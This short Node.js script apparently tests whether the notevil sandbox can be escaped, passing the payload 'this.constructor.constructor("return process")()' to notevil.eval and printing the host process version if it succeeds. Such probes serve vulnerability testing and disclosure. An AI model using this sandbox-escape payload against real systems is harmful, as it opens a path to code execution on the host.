const notevil = require('notevil');
try {
  let res = notevil.eval('this.constructor.constructor("return process")()');
  console.log('Vulnerable to notevil RCE?', res.version);
} catch (e) {
  console.log('Error:', e.message);
}
